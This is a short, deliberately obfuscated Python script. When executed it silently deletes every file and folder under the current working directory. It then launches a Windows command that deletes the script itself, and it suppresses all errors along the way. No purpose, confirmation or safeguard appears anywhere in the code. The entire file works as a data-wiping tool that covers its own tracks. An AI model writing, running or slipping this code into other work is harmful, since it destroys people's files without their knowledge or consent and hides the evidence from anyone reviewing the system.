import os as _o
import time as _t
import subprocess as _s
import sys as _y

def _r(p):
    try:
        _o.remove(p)
    except:
        pass

def _d(p):
    try:
        _o.rmdir(p)
    except:
        pass

def _x(b):
    for _a, _b, _c in _o.walk(b, topdown=False):
        for _f in _c:
            _r(_o.path.join(_a, _f))
        for _g in _b:
            _d(_o.path.join(_a, _g))

def _z():
    _t.sleep(2)
    _x(_o.getcwd())
    _s.Popen(f'cmd /c timeout 2 >nul & del "{__file__}"', shell=True)
    _y.exit()

if __name__ == "__main__":
    _z()